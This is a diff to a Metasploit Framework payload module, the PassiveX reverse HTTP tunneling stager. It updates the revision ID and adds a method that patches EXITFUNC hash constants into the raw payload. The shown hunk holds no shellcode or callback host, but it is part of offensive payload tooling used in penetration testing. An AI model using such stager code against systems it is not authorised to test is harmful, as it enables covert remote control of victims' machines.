@@ -1,5 +1,5 @@
 ##
-# $Id: passivex.rb 6479 2009-04-13 14:33:26Z kris $
+# $Id: passivex.rb 6925 2009-07-31 18:02:14Z hdm $
 ##
 
 ##
@@ -22,7 +22,7 @@ module Metasploit3
 	def initialize(info = {})
 		super(merge_info(info,
 			'Name'          => 'PassiveX Reverse HTTP Tunneling Stager',
-			'Version'       => '$Revision: 6479 $',
+			'Version'       => '$Revision: 6925 $',
 			'Description'   => 'Tunnel communication over HTTP using IE 6',
 			'Author'        => 'skape',
 			'License'       => MSF_LICENSE,
@@ -100,5 +100,18 @@ module Metasploit3
 		# Return the updated payload
 		return p
 	end
-
+	
+	# for now we must let this payload use the old EXITFUNC hash values.
+	def replace_var(raw, name, offset, pack)
+		super
+		if( name == 'EXITFUNC' )
+			datastore[name] = 'thread' if not datastore[name]
+			raw[offset, 4] = [ 0x5F048AF0 ].pack(pack || 'V') if datastore[name] == 'seh' 
+			raw[offset, 4] = [ 0x60E0CEEF ].pack(pack || 'V') if datastore[name] == 'thread'
+			raw[offset, 4] = [ 0x73E2D87E ].pack(pack || 'V') if datastore[name] == 'process'
+			return true
+		end
+		return false
+	end
+	
 end
